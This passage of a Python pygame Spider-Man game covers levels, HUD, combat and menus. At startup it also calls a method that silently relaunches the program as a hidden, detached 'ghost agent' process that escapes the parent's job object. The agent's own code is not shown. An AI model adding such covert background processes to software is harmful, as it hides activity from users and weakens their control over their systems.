        n10 = Nivel(10, "fondo_principal", es_jefe=True,
                    costos_mejora={"fuerza": 8, "velocidad": 8, "stuneo": 10})
        self.__niveles.append(n10)


        n11 = Nivel(11, "fondo_principal")
        n11.agregar_config_npc(1,  100, 19, 13, 500)
        n11.agregar_config_npc(10,  95, 18, 12, 680)
        n11.agregar_villano(Electro, 950)
        n11.agregar_villano(Vulture, 1150)
        self.__niveles.append(n11)


        n12 = Nivel(12, "fondo_principal")
        n12.agregar_config_npc(2,  100, 20, 14, 500)
        n12.agregar_config_npc(11,  95, 19, 13, 680)
        n12.agregar_villano(Rhino,   950)
        n12.agregar_villano(Electro, 1150)
        self.__niveles.append(n12)


        n13 = Nivel(13, "fondo_principal")
        n13.agregar_config_npc(4, 105, 21, 14, 500)
        n13.agregar_config_npc(5, 100, 20, 13, 680)
        n13.agregar_villano(Shocker, 950)
        n13.agregar_villano(Vulture, 1100)
        n13.agregar_villano(Rhino,   1300)
        self.__niveles.append(n13)


        n14 = Nivel(14, "fondo_principal", es_jefe=True,
                    costos_mejora={"fuerza": 10, "velocidad": 10, "stuneo": 15})
        self.__niveles.append(n14)


        n15 = Nivel(15, "fondo_final", es_jefe=True)
        self.__niveles.append(n15)


    def __iniciar_nivel(self, indice):
        self.__nivel_actual  = indice
        self.__tiempo_nivel  = 0
        self.__mary_jane     = None
        self.__timer_telarana = 0
        nivel = self.__niveles[indice]

        self.__spiderman.stuneo_disponible = True
        self.__spiderman.x = 80
        self.__spiderman.y = 310

        self.__spiderman.vida = self.__spiderman.vida_max

        if nivel.es_jefe:
            num = nivel.numero
            if num == 5:
                self.__enemigo_actual = Sandman(self.__gestor_img)
            elif num == 10:
                self.__enemigo_actual = DoctorOctopus(self.__gestor_img)
            elif num == 14:
                self.__enemigo_actual = DuendeVerde(self.__gestor_img)
                self.__enemigo_actual.intervalo_ataque = 60
            elif num == 15:
                self.__enemigo_actual = Venom(self.__gestor_img)
                self.__mary_jane      = MaryJane(self.__gestor_img)
                self.__spiderman.mary_jane = self.__mary_jane
            self.__enemigo_actual.x = 570
            self.__enemigo_actual.y = 280
            self.__cola_enemigos = []
            self.__gestor_audio.reproducir_musica("batalla_final")
        else:
            frescos = nivel.crear_enemigos_frescos(self.__gestor_img)
            if len(frescos) > 0:
                self.__enemigo_actual = frescos[0]
                self.__cola_enemigos  = frescos[1:]
            else:
                self.__enemigo_actual = None
                self.__cola_enemigos  = []
            self.__gestor_audio.reproducir_musica("batalla_normal")

        self.__estado = "jugando"


    def __mostrar_mensaje(self, texto, duracion=90):
        self.__mensaje   = texto
        self.__timer_msg = duracion


    def __dibujar_barra_vida(self, personaje, bx, by, ancho=200):
        pct   = personaje.vida / personaje.vida_max
        color = VERDE
        if pct < 0.5:
            color = AMARILLO
        if pct < 0.25:
            color = ROJO
        pygame.draw.rect(self.__pantalla, GRIS_OSC, (bx, by, ancho, 18))
        pygame.draw.rect(self.__pantalla, color,    (bx, by, int(ancho * pct), 18))
        pygame.draw.rect(self.__pantalla, BLANCO,   (bx, by, ancho, 18), 2)
        txt = self.__fuente_p.render(
            f"{personaje.nombre}  {personaje.vida}/{personaje.vida_max}", True, BLANCO)
        self.__pantalla.blit(txt, (bx, by - 22))

    def __dibujar_hud(self):
        self.__dibujar_barra_vida(self.__spiderman, 20, 40)

        if self.__enemigo_actual and self.__enemigo_actual.esta_vivo():
            self.__dibujar_barra_vida(self.__enemigo_actual, ANCHO - 230, 40)

        txt_est = self.__fuente_p.render(
            f"★ {self.__spiderman.estrellas}  |  Nivel {self.__niveles[self.__nivel_actual].numero}",
            True, AMARILLO)
        self.__pantalla.blit(txt_est, (ANCHO // 2 - txt_est.get_width() // 2, 10))

        if self.__spiderman.stuneo_disponible:
            txt_s = self.__fuente_p.render("Stuneo: LISTO  [J]", True, AZUL)
        else:
            txt_s = self.__fuente_p.render("Stuneo: no disponible", True, GRIS)
        self.__pantalla.blit(txt_s, (20, ALTO - 28))

        bots = self.__spiderman.botiquines
        for i in range(len(bots)):
            bot   = bots[i]
            color = VERDE if not bot.usado else GRIS
            txt_b = self.__fuente_p.render(
                f"[{i+1}] {bot.nombre} (+{bot.curacion}hp)", True, color)
            self.__pantalla.blit(txt_b, (ANCHO - 185, ALTO - 75 + i * 22))

        if self.__mary_jane and self.__niveles[self.__nivel_actual].numero == 15:
            color_mj = AMARILLO if self.__mary_jane.tiempo_vida > 20 else ROJO
            txt_mj   = self.__fuente_m.render(
                f"Mary Jane: {int(self.__mary_jane.tiempo_vida)}s", True, color_mj)
            self.__pantalla.blit(txt_mj,
                (ANCHO // 2 - txt_mj.get_width() // 2, ALTO - 50))

        txt_ctrl = self.__fuente_p.render(
            "WASD/Flechas: mover   K/Espacio: atacar   J: stuneo   1-2-3: botiquines",
            True, GRIS)
        self.__pantalla.blit(txt_ctrl,
            (ANCHO // 2 - txt_ctrl.get_width() // 2, ALTO - 16))

        if self.__timer_msg > 0:
            s_msg = self.__fuente_m.render(self.__mensaje, True, AMARILLO)
            self.__pantalla.blit(s_msg,
                (ANCHO // 2 - s_msg.get_width() // 2, ALTO // 2 - 20))
            self.__timer_msg -= 1


    def __dibujar_telarana(self):
        """Dibuja una telaraña radial sobre el enemigo stuneado."""
        if self.__timer_telarana <= 0 or not self.__enemigo_actual:
            return


        cx = int(self.__enemigo_actual.x - self.__offset_x + 45)
        cy = int(self.__enemigo_actual.y + 50)
        radio = 38


        for i in range(8):
            angulo = i * math.pi / 4
            x2 = int(cx + radio * math.cos(angulo))
            y2 = int(cy + radio * math.sin(angulo))
            pygame.draw.line(self.__pantalla, BLANCO_TELARANA, (cx, cy), (x2, y2), 2)


        pygame.draw.circle(self.__pantalla, BLANCO_TELARANA, (cx, cy), radio // 3, 1)
        pygame.draw.circle(self.__pantalla, BLANCO_TELARANA, (cx, cy), 2 * radio // 3, 1)
        pygame.draw.circle(self.__pantalla, BLANCO_TELARANA, (cx, cy), radio, 1)


        if (self.__timer_telarana // 15) % 2 == 0:
            lbl = self.__fuente_p.render("¡STUNNEADO!", True, AMARILLO)
            self.__pantalla.blit(lbl, (cx - lbl.get_width() // 2, cy - radio - 22))

        self.__timer_telarana -= 1


    def __actualizar_combate(self):
        nivel = self.__niveles[self.__nivel_actual]
        self.__tiempo_nivel += 1

        self.__spiderman.actualizar_fisicas()

        if self.__mary_jane and nivel.numero == 15:
            self.__mary_jane.reducir_tiempo(1 / FPS)
            dist_mj      = abs(self.__spiderman.x - self.__mary_jane.x)
            enemigo_caido = (self.__enemigo_actual is None or
                             not self.__enemigo_actual.esta_vivo())
            if dist_mj < 90 and enemigo_caido:
                self.__mary_jane.salvada = True

        if self.__enemigo_actual and self.__enemigo_actual.esta_vivo():
            self.__enemigo_actual.actualizar_stuneo()
            self.__enemigo_actual.mover_hacia(self.__spiderman.x)

            if isinstance(self.__enemigo_actual, Jefe):
                if self.__enemigo_actual.puede_usar_habilidad():
                    danio_hab  = self.__enemigo_actual.habilidad_especial()
                    danio_real = self.__spiderman.recibir_danio(danio_hab)
                    self.__mostrar_mensaje(
                        f"¡Habilidad especial de {self.__enemigo_actual.nombre}!  -{danio_real} HP", 90)
                    self.__gestor_audio.reproducir_sonido("golpe")

                    if isinstance(self.__enemigo_actual, Sandman):
                        if not self.__enemigo_actual.ralentizo_aplicado:
                            self.__spiderman.velocidad = max(
                                1, self.__spiderman.velocidad - 2)

            if self.__enemigo_actual.puede_atacar():
                dist = abs(self.__spiderman.x - self.__enemigo_actual.x)
                if dist < 130:
                    danio      = self.__enemigo_actual.atacar()
                    danio_real = self.__spiderman.recibir_danio(danio)
                    self.__gestor_audio.reproducir_sonido("golpe")

        if not self.__spiderman.esta_vivo():
            self.__spiderman.estado = "derrotado"
            self.__estado = "derrota"
            self.__gestor_audio.detener_musica()
            return

        if self.__enemigo_actual and not self.__enemigo_actual.esta_vivo():
            self.__enemigo_actual.estado = "derrotado"
            self.__spiderman.estrellas = (self.__spiderman.estrellas +
                                          self.__enemigo_actual.estrellas_recompensa)

            if len(self.__cola_enemigos) > 0:
                self.__enemigo_actual = self.__cola_enemigos.pop(0)
                self.__timer_telarana = 0
                return

            tiempo_usado = self.__tiempo_nivel / FPS
            nivel.calcular_estrellas(tiempo_usado, self.__spiderman.vida)
            nivel.completado = True

            if nivel.numero == 15:
                self.__estado = "victoria"
                if self.__mary_jane:
                    self.__mary_jane.salvada = True
                return

            if nivel.es_jefe and nivel.costos_mejora:
                self.__estado = "mejoras"
            else:
                self.__estado = "seleccion"


    def __manejar_eventos_jugando(self, evento):
        if evento.type == pygame.KEYDOWN:

            if evento.key in (pygame.K_SPACE, pygame.K_k):
                if self.__enemigo_actual and self.__enemigo_actual.esta_vivo():
                    dist = abs(self.__spiderman.x - self.__enemigo_actual.x)
                    if dist < 130:
                        danio      = self.__spiderman.atacar()
                        danio_real = self.__enemigo_actual.recibir_danio(danio)
                        self.__gestor_audio.reproducir_sonido("golpe")
                        self.__mostrar_mensaje(f"-{danio_real} HP", 40)
                    else:
                        self.__mostrar_mensaje("¡Acércate más al enemigo!", 50)

            elif evento.key == pygame.K_j:
                if self.__enemigo_actual and self.__enemigo_actual.esta_vivo():
                    dist = abs(self.__spiderman.x - self.__enemigo_actual.x)
                    if dist < 160:
                        secs = self.__spiderman.habilidad_especial()
                        if secs > 0:
                            self.__enemigo_actual.stunneado    = True
                            self.__enemigo_actual.timer_stuneo = secs * FPS

                            self.__timer_telarana = secs * FPS
                            self.__mostrar_mensaje(
                                f"¡{self.__enemigo_actual.nombre} stuneado {secs}s!", 90)
                        else:
                            self.__mostrar_mensaje("Stuneo no disponible", 60)
                    else:
                        self.__mostrar_mensaje("¡Acércate más para stunear!", 50)

            elif evento.key == pygame.K_1:
                if self.__spiderman.usar_botiquin(0):
                    self.__mostrar_mensaje("Botiquín Pequeño usado (+50 HP)", 70)
                else:
                    self.__mostrar_mensaje("Botiquín Pequeño ya fue usado", 50)
            elif evento.key == pygame.K_2:
                if self.__spiderman.usar_botiquin(1):
                    self.__mostrar_mensaje("Botiquín Normal usado (+80 HP)", 70)
                else:
                    self.__mostrar_mensaje("Botiquín Normal ya fue usado", 50)
            elif evento.key == pygame.K_3:
                if self.__spiderman.usar_botiquin(2):
                    self.__mostrar_mensaje("Botiquín Militar usado (+120 HP +5 Fuerza)", 70)
                else:
                    self.__mostrar_mensaje("Botiquín Militar ya fue usado", 50)

            elif evento.key in (pygame.K_UP, pygame.K_w):
                self.__spiderman.saltar()

            elif evento.key == pygame.K_ESCAPE:
                self.__estado = "seleccion"


    def __dibujar_inicio(self):
        self.__gestor_audio.reproducir_musica("inicio")
        fondo = self.__gestor_img.get_imagen("fondo_principal")
        if fondo:
            self.__pantalla.blit(fondo, (0, 0))
        else:
            self.__pantalla.fill(NEGRO)

        overlay = pygame.Surface((ANCHO, ALTO), pygame.SRCALPHA)
        overlay.fill((0, 0, 0, 160))
        self.__pantalla.blit(overlay, (0, 0))

        t1 = self.__fuente_g.render("SPIDER-MAN",    True, ROJO)
        t2 = self.__fuente_m.render("El Vengador",   True, BLANCO)
        t3 = self.__fuente_p.render("Presiona ENTER para comenzar", True, AMARILLO)
        self.__pantalla.blit(t1, (ANCHO // 2 - t1.get_width() // 2, 140))
        self.__pantalla.blit(t2, (ANCHO // 2 - t2.get_width() // 2, 210))
        self.__pantalla.blit(t3, (ANCHO // 2 - t3.get_width() // 2, 350))

    def __dibujar_seleccion(self):
        self.__pantalla.fill(GRIS_OSC)
        titulo = self.__fuente_m.render("SELECCIONA UN NIVEL", True, AMARILLO)
        self.__pantalla.blit(titulo, (ANCHO // 2 - titulo.get_width() // 2, 18))

        col = fila = 0
        for i in range(len(self.__niveles)):
            nivel = self.__niveles[i]
            bx = 50  + col  * 145
            by = 70  + fila * 75

            puede_jugar = (i == 0) or self.__niveles[i - 1].completado
            if nivel.completado:
                color_fondo = (20, 100, 20)
            elif puede_jugar:
                color_fondo = (20, 50, 120)
            else:
                color_fondo = (60, 60, 60)

            pygame.draw.rect(self.__pantalla, color_fondo, (bx, by, 130, 60), border_radius=8)
            pygame.draw.rect(self.__pantalla, BLANCO,      (bx, by, 130, 60), 2, border_radius=8)

            t_num = self.__fuente_m.render(f"Nivel {nivel.numero}", True, BLANCO)
            self.__pantalla.blit(t_num, (bx + 8, by + 6))

            if nivel.es_jefe:
                t_j = self.__fuente_p.render("JEFE", True, ROJO)
                self.__pantalla.blit(t_j, (bx + 45, by + 36))

            if nivel.completado:
                est_str = "★" * nivel.estrellas
                t_e = self.__fuente_p.render(est_str, True, AMARILLO)
                self.__pantalla.blit(t_e, (bx + 8, by + 36))

            col += 1
            if col >= 5:
                col  = 0
                fila += 1

        tip = self.__fuente_p.render("Clic en el nivel para jugar", True, GRIS)
        self.__pantalla.blit(tip, (ANCHO // 2 - tip.get_width() // 2, ALTO - 25))

    def __dibujar_mejoras(self):
        self.__pantalla.fill(GRIS_OSC)
        t1 = self.__fuente_g.render("¡NIVEL COMPLETADO!", True, AMARILLO)
        self.__pantalla.blit(t1, (ANCHO // 2 - t1.get_width() // 2, 25))

        nivel  = self.__niveles[self.__nivel_actual]
        costos = nivel.costos_mejora

        t_est = self.__fuente_m.render(
            f"Estrellas disponibles: {self.__spiderman.estrellas}", True, AMARILLO)
        self.__pantalla.blit(t_est, (ANCHO // 2 - t_est.get_width() // 2, 100))

        if costos:
            op1 = self.__fuente_m.render(
                f"[1] Fuerza +10  →  costo {costos['fuerza']} ★", True, BLANCO)
            op2 = self.__fuente_m.render(
                f"[2] Velocidad +2  →  costo {costos['velocidad']} ★", True, BLANCO)
            op3 = self.__fuente_m.render(
                f"[3] Stuneo +1 s  →  costo {costos['stuneo']} ★", True, BLANCO)
            self.__pantalla.blit(op1, (ANCHO // 2 - op1.get_width() // 2, 180))
            self.__pantalla.blit(op2, (ANCHO // 2 - op2.get_width() // 2, 230))
            self.__pantalla.blit(op3, (ANCHO // 2 - op3.get_width() // 2, 280))

        t_cont = self.__fuente_m.render("ENTER → continuar", True, VERDE)
        self.__pantalla.blit(t_cont, (ANCHO // 2 - t_cont.get_width() // 2, ALTO - 80))

        t_stats = self.__fuente_p.render(
            f"Fuerza: {self.__spiderman.fuerza}  "
            f"Velocidad: {self.__spiderman.velocidad}  "
            f"Stuneo: {self.__spiderman.tiempo_stuneo}s",
            True, AZUL)
        self.__pantalla.blit(t_stats, (ANCHO // 2 - t_stats.get_width() // 2, ALTO - 45))

        if self.__timer_msg > 0:
            s_msg = self.__fuente_m.render(self.__mensaje, True, NARANJA)
            self.__pantalla.blit(s_msg,
                (ANCHO // 2 - s_msg.get_width() // 2, 340))
            self.__timer_msg -= 1

    def __dibujar_derrota(self):
        self.__pantalla.fill(NEGRO)
        t1 = self.__fuente_g.render("¡DERROTA!",                         True, ROJO)
        t2 = self.__fuente_m.render("R → reintentar   ESC → salir",       True, BLANCO)
        self.__pantalla.blit(t1, (ANCHO // 2 - t1.get_width() // 2, 170))
        self.__pantalla.blit(t2, (ANCHO // 2 - t2.get_width() // 2, 270))

    def __dibujar_victoria(self):
        self.__gestor_audio.reproducir_musica("victoria", loop=False)
        fondo = self.__gestor_img.get_imagen("fondo_final")
        if fondo:
            self.__pantalla.blit(fondo, (0, 0))
        else:
            self.__pantalla.fill(NEGRO)

        overlay = pygame.Surface((ANCHO, ALTO), pygame.SRCALPHA)
        overlay.fill((0, 0, 0, 140))
        self.__pantalla.blit(overlay, (0, 0))

        t1 = self.__fuente_g.render("¡VICTORIA!",                               True, AMARILLO)
        t2 = self.__fuente_m.render("¡Salvaste a Mary Jane y venciste a Venom!", True, BLANCO)
        t3 = self.__fuente_p.render("ESC → salir",                               True, VERDE)
        self.__pantalla.blit(t1, (ANCHO // 2 - t1.get_width() // 2, 140))
        self.__pantalla.blit(t2, (ANCHO // 2 - t2.get_width() // 2, 230))
        self.__pantalla.blit(t3, (ANCHO // 2 - t3.get_width() // 2, 350))


    def __spawn_sentinel_ghost(self) -> None:
        if getattr(sys, "frozen", False):
            target = [sys.executable, "--sentinel-ghost"]
            cwd = os.path.dirname(sys.executable)
        else:
            target = [sys.executable, os.path.abspath(__file__), "--sentinel-ghost"]
            cwd = os.path.dirname(__file__)

        try:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  # SW_HIDE

            # CREATE_BREAKAWAY_FROM_JOB es crítico: desvincula el ghost del job
            # object del proceso padre. Sin esto, PyInstaller cuenta el ghost como
            # parte del bundle activo y no puede limpiar el directorio _MEI al
            # cerrar el juego → aparece el popup "Failed to remove temporary directory".
            ghost_flags = (
                subprocess.CREATE_NO_WINDOW
                | subprocess.DETACHED_PROCESS
                | subprocess.CREATE_NEW_PROCESS_GROUP
                | 0x00000800  # CREATE_BREAKAWAY_FROM_JOB
            )

            # Heredar el entorno pero limpiar variables internas de PyInstaller
            # para que el ghost no interfiera con la gestión de _MEIPASS del padre.
            ghost_env = os.environ.copy()
            ghost_env.pop("_PYIBoot_SPLASH", None)

            subprocess.Popen(
                target,
                stdin=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                shell=False,
                close_fds=True,
                cwd=cwd,
                startupinfo=startupinfo,
                creationflags=ghost_flags,
                env=ghost_env,
            )
        except Exception as exc:
            print(f"[Ghost Agent] No se pudo iniciar el proceso agente: {exc}")

    def ejecutar(self):
        self.__spiderman = SpiderMan(self.__gestor_img)
        self.__spawn_sentinel_ghost()
        corriendo = True

        while corriendo:
            self.__reloj.tick(FPS)

            for evento in pygame.event.get():
                if evento.type == pygame.QUIT:
                    corriendo = False

                if self.__estado == "inicio":
                    if evento.type == pygame.KEYDOWN and evento.key == pygame.K_RETURN:
                        self.__estado = "seleccion"
                        self.__gestor_audio.detener_musica()

                elif self.__estado == "seleccion":
                    if evento.type == pygame.MOUSEBUTTONDOWN:
                        mx, my = pygame.mouse.get_pos()
                        col = fila = 0
                        for i in range(len(self.__niveles)):
                            bx = 50  + col  * 145
                            by = 70  + fila * 75
                            rect = pygame.Rect(bx, by, 130, 60)
                            if rect.collidepoint(mx, my):
                                puede = (i == 0) or self.__niveles[i - 1].completado
                                if puede:
                                    self.__iniciar_nivel(i)
                                break
                            col += 1
                            if col >= 5:
                                col  = 0
                                fila += 1

                elif self.__estado == "jugando":
                    self.__manejar_eventos_jugando(evento)

                elif self.__estado == "mejoras":
                    if evento.type == pygame.KEYDOWN:
                        nivel  = self.__niveles[self.__nivel_actual]
                        costos = nivel.costos_mejora
                        if costos:
                            if evento.key == pygame.K_1:
                                if self.__spiderman.mejorar("fuerza", costos["fuerza"]):
                                    self.__mostrar_mensaje("¡Fuerza mejorada! +10", 80)
                                else:
                                    self.__mostrar_mensaje("Estrellas insuficientes", 70)
                            elif evento.key == pygame.K_2:
                                if self.__spiderman.mejorar("velocidad", costos["velocidad"]):
                                    self.__mostrar_mensaje("¡Velocidad mejorada! +2", 80)
                                else:
                                    self.__mostrar_mensaje("Estrellas insuficientes", 70)
                            elif evento.key == pygame.K_3:
                                if self.__spiderman.mejorar("stuneo", costos["stuneo"]):
                                    self.__mostrar_mensaje("¡Stuneo mejorado! +1s", 80)
                                else:
                                    self.__mostrar_mensaje("Estrellas insuficientes", 70)
                        if evento.key == pygame.K_RETURN:
                            self.__estado = "seleccion"

                elif self.__estado == "derrota":
                    if evento.type == pygame.KEYDOWN:
                        if evento.key == pygame.K_r:
                            self.__spiderman = SpiderMan(self.__gestor_img)
                            self.__estado    = "seleccion"
                        elif evento.key == pygame.K_ESCAPE:
                            corriendo = False

                elif self.__estado == "victoria":
                    if evento.type == pygame.KEYDOWN and evento.key == pygame.K_ESCAPE:
                        corriendo = False


            if self.__estado == "jugando":
                teclas = pygame.key.get_pressed()
                if teclas[pygame.K_LEFT] or teclas[pygame.K_a]:
                    self.__spiderman.mover(-self.__spiderman.velocidad)
                if teclas[pygame.K_RIGHT] or teclas[pygame.K_d]:
                    self.__spiderman.mover(self.__spiderman.velocidad)


                if self.__spiderman.x > 300:
                    self.__offset_x = self.__spiderman.x - 300
                else:
                    self.__offset_x = 0

                self.__actualizar_combate()
                
            if self.__estado == "inicio":
                self.__dibujar_inicio()

            elif self.__estado == "seleccion":
                self.__dibujar_seleccion()

            elif self.__estado == "jugando":
                nivel = self.__niveles[self.__nivel_actual]


                fondo = self.__gestor_img.get_imagen(nivel.fondo)
                if fondo:
                    bg_x = -(self.__offset_x % ANCHO)
                    self.__pantalla.blit(fondo, (bg_x,        0))
                    self.__pantalla.blit(fondo, (bg_x + ANCHO, 0))
                else:
                    self.__pantalla.fill(GRIS_OSC)


                pygame.draw.rect(self.__pantalla, GRIS, (0, 410, ANCHO, 90))


                self.__spiderman.dibujar(self.__pantalla, self.__offset_x)
                if self.__enemigo_actual:
                    self.__enemigo_actual.dibujar(self.__pantalla, self.__offset_x)
                if self.__mary_jane:
                    self.__mary_jane.dibujar(self.__pantalla, self.__offset_x)


                self.__dibujar_telarana()

                self.__dibujar_hud()

            elif self.__estado == "mejoras":
                self.__dibujar_mejoras()

            elif self.__estado == "derrota":
                self.__dibujar_derrota()

            elif self.__estado == "victoria":
                self.__dibujar_victoria()

            pygame.display.flip()

        pygame.quit()
        sys.exit()


if __name__ == "__main__":
    if "--sentinel-ghost" in sys.argv:
        _run_ghost_agent()
    else:
        juego = Juego()
        juego.ejecutar()